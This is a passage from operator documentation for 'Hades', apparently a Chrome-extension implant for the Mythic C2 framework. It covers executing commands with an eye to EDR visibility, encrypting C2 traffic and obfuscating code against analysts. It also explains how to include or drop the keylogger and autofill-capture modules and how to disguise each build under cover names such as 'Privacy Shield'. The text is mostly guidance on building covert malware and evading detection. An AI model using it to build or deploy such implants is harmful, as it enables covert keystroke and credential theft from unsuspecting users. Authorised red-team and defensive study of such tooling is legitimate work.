exec {"cmd": "import os; print(os.listdir('/tmp'))", "mode": "python"}
```

Use `mode=direct` for simple OS binaries when Python won't do — binary exec'd directly, no shell wrapper:
```
exec whoami
exec {"cmd": "id -un", "mode": "direct"}
exec {"cmd": "security find-certificate -a", "mode": "direct"}
```

Use `mode=shell` only when shell features (pipes, redirects, wildcards) are truly required — accept the added EDR visibility:
```
exec {"cmd": "cat /etc/hosts | grep -v localhost", "mode": "shell"}
exec {"cmd": "find /Users -name '*.plist' 2>/dev/null", "mode": "shell"}
```

---

## 13. Encryption & Key Modes

All agent traffic uses two protection layers:

| Layer | Mechanism |
|---|---|
| Transport | TLS (`wss://` / `https://`) |
| Application | AES-256-CBC + HMAC-SHA256 |

Wire format: `base64( UUID[36] + IV[16] + AES-CBC(plaintext) + HMAC-SHA256[32] )`

This matches Mythic's native `aes256_hmac` format.

### Key modes

| Mode | `encrypted_exchange_check` | Key source | Forward secrecy |
|---|---|---|---|
| **PSK** (static) | `false` | AES-256 key baked into payload at build time | No |
| **EKE** (RSA key exchange) | `true` | Per-session key negotiated via RSA-OAEP at first contact | Yes |

### EKE handshake (step by step)

1. Agent generates a random 32-byte AES session key
2. Agent RSA-OAEP encrypts the session key with Mythic's RSA public key (embedded at build)
3. Agent sends `base64(PayloadUUID + RSA_encrypt(session_key))` -- raw, not AES-encrypted
4. Mythic decrypts with its RSA private key, generates a permanent session key
5. Mythic responds (encrypted with the temp key): `{action: "staging_rsa", uuid, session_key}`
6. Agent imports the permanent session key and staging UUID
7. Agent sends a normal AES-encrypted check-in using the permanent key
8. All subsequent traffic uses the permanent session key

Even if the `.zip` payload is captured, the RSA public key cannot decrypt traffic. Only
Mythic's server-side RSA private key can recover session keys.

---

## 14. Code Obfuscation

The `obfuscate` build parameter runs `javascript-obfuscator` on all `.js` files in the
extension zip at build time. Each level adds techniques on top of the previous one.

### Level: `none`

No transformation. Source code is human-readable. Useful for debugging.

- Output is identical to the source (after placeholder substitution and command stripping)
- File size: baseline (1x)

### Level: `low`

Defends against casual inspection. Fast build times.

| Technique | What it does |
|---|---|
| **String array extraction** | All string literals (`"chrome"`, `"tabs"`, `"[Hades]"`, etc.) are moved into a single array. Code references them by index via wrapper functions. |
| **String array RC4 encoding** | The string array entries are RC4-encrypted. A decoder function decrypts them at runtime. Prevents simple `strings` or `grep` from finding keywords. |
| **Hex identifier renaming** | All local and global variable/function names are replaced with hex identifiers (e.g. `cmdScreenshot` -> `_0xa3f1e2`). |
| **Compact output** | Whitespace and formatting removed. Single-line output. |

- File size: ~2x baseline
- Build time: seconds

### Level: `medium` (recommended default)

Significantly raises the cost of manual reverse engineering.

Includes everything from `low`, plus:

| Technique | What it does |
|---|---|
| **Control flow flattening (50%)** | Half of all function bodies are rewritten as `while(true) { switch(state) { ... } }` state machines. The original sequential logic is scrambled across numbered states. An analyst cannot read the code linearly. |
| **Dead code injection (20%)** | 20% of code blocks have unreachable but plausible-looking code paths inserted. These contain realistic variable names and operations. Analysts must trace control flow to distinguish real from fake code. |
| **String splitting (10-char chunks)** | Remaining string literals are split into 10-character fragments joined by concatenation (`"background" -> "backgr" + "ound"`). Defeats simple substring searches. |

- File size: ~3--4x baseline
- Build time: 5--15 seconds

### Level: `high`

Maximum static analysis resistance. Use when the payload may be forensically examined.

Includes everything from `medium`, plus:

| Technique | What it does |
|---|---|
| **Control flow flattening (75%)** | Three-quarters of function bodies become state machines. Almost no linear code remains. |
| **Dead code injection (40%)** | Nearly half of all code blocks contain fake paths. The ratio of real to decoy code approaches 1:1. |
| **String array function wrappers (3, chained)** | String array access goes through 3 layers of wrapper functions that call each other. Tracing a single string reference requires following a chain of 3+ function calls. |
| **String array call transform** | The wrapper functions are additionally transformed so their call patterns vary. No two string lookups look identical in the AST. |
| **String array threshold (80%)** | 80% of all strings (including short ones like `"id"`, `"ok"`) are moved to the encrypted array. Very few inline strings remain. |

- File size: ~5--8x baseline
- Build time: 15--60 seconds
- **Note:** `--transform-object-keys` and `--numbers-to-expressions` are intentionally
  excluded from this level. They break Web Crypto API parameter objects
  (`{name: "RSA-OAEP", hash: "SHA-1"}`) and numeric constants in the AES/HMAC code.

### What obfuscation does NOT rename

Chrome extension API property names (`chrome.tabs.query`, `chrome.runtime.sendMessage`,
`crypto.subtle.importKey`, etc.) are external APIs resolved at runtime. They cannot be
renamed. An analyst can still identify Chrome API usage patterns, but the agent's internal
logic -- command dispatch, crypto protocol, C2 handling -- becomes opaque.

---

## 15. Modular Command Inclusion

The builder only includes code for commands selected in the Mythic UI's **Commands** step.

### How it works

1. Every command's code in `background.js` is wrapped in `// __CMD__ name` / `// __ENDCMD__`
   marker comments (both the dispatcher entry and the implementation function)
2. At build time, the builder reads which commands the operator selected
3. `strip_unused_commands()` removes all marked blocks whose command tags don't match
4. Content scripts are conditionally included:

| Content script | Included when | Excluded when |
|---|---|---|
| `keylogger.js` | `keylog` or `disable_keylog` selected | Neither selected |
| `autofill.js` | `keylog` or `disable_keylog` selected | Neither selected |

5. `manifest.json` content_scripts entries are updated to match (excluded scripts are
   removed from the manifest)
6. `sleep`, `exit_running`, and `exit_full` are always included regardless of selection

### Why this matters

- **Reduced fingerprint**: Each build contains only the capabilities needed for that
  operation. A screenshot-only payload has no keylogger code, no proxy module, no download
  intercept -- making attribution and signature development harder.
- **Improved obfuscation**: Fewer functions and strings means the obfuscator's dead code
  injection and control flow flattening are a larger proportion of the total code. The
  signal-to-noise ratio for analysts gets worse.
- **Smaller payloads**: Excluding the proxy module alone removes ~400 lines. A minimal
  build (`sysinfo` + `screenshot` + `exit_full`) is roughly 40% the size of a full build.

---

## 16. Filename & Identity Randomisation

Every build produces a unique extension with no shared static indicators.

### What gets randomised

| Element | Default (blank) | Operator-specified |
|---|---|---|
| Extension name | Random from pool: "Tab Manager Plus", "Privacy Shield", "Dark Reader Helper", "Page Loader", "Session Sync", etc. | Operator's exact string |
| Extension description | Random cover description matching the pool | Operator's exact string |
| Extension version | Random `X.Y.Z` (e.g. `3.7.2`) | Always random |
| `background.js` filename | Random: `worker_c3d8.js`, `a3f9c1e2b7.js`, `runtime_bf2a.js`, etc. | Operator's string (`.js` auto-appended) |
| `keylogger.js` filename | Random (same styles as above) | Operator's string |
| `autofill.js` filename | Random | Operator's string |
| `manifest.json` | Always rewritten with the above values | -- |

### Filename generation styles

Random filenames are generated in one of three styles per build:
- **Hex-like**: `a3f9c1e2b7.js` (6--12 alphanumeric chars)
- **Prefixed**: `module_bf2a91.js`, `worker_c3d8.js`, `helper_a7e2f1.js`
- **Functional**: `content2847.js`, `loader91.js`, `init4523.js`

No two builds share the same filenames, extension name, or version number. There are no
static strings like "Hades", "keylogger", or "autofill" anywhere in the delivered zip.

---

## 17. Iterating on the Agent

### Python container changes (commands, builder)

```bash
./mythic-cli build hades
./mythic-cli start hades
```

### JavaScript-only changes

No container restart needed. Rebuild the payload in the Mythic UI and reload the extension
in Chrome: `chrome://extensions` -> extension card -> reload button.

### Full restart

```bash
./mythic-cli stop
./mythic-cli start
```

---

## 18. Troubleshooting

**Container not in `mythic-cli status`:**
```bash
docker logs mythic_hades_1
```
Look for Python import errors or missing dependencies.

**No callback after loading extension:**
- Check `chrome://extensions` -> extension card -> **Errors** for JS exceptions
- Verify `callback_host` is reachable from the target
- Confirm the C2 profile container is running and listening
- Open the service worker console (`chrome://extensions` -> extension -> **Service Worker
  -> Inspect**) and look for `[Hades]` log lines

**Build message shows "WARNING: encrypted_exchange_check=true but key is only 44 chars":**
- The C2 profile was started with `encrypted_exchange_check = false`. Stop the profile,
  set it to `true`, restart it, then rebuild the payload.

**Commands submitted but no output:**
- Run `sleep 5` to confirm the tasking loop is alive
- Check `[Hades]` lines in the service worker console

**Icon not appearing:**
- Must be at `<mythic-root>/agent_icons/hades.svg` (exact name, Mythic root directory)
- Restart Mythic after copying the file
- Or use **Settings -> Payload Types -> hades -> Edit Icon**

**`geolocation` returns permission denied:**
- Only works on pages where the user has already granted location access

**`download_intercept_start` not firing:**
- Confirm the intercept was armed *before* the download started
- Use WebSocket mode for instant task delivery
- The pattern match is a case-insensitive substring check on URL and filename

**Obfuscation build fails or extension won't load:**
- Try `obfuscate = medium` (default). The `high` level produces larger files that Chrome
  may be slower to parse.
- `none` is useful for debugging but exposes all source code on disk.
- Check `docker logs mythic_hades_1` for `javascript-obfuscator` errors.

**PID shows a small number instead of a real process ID:**
- Chrome extensions cannot access OS-level PIDs. The PID field is a stable hash of
  `chrome.runtime.id` (the extension's unique 32-character ID). It is consistent across
  service worker restarts for the same extension installation.
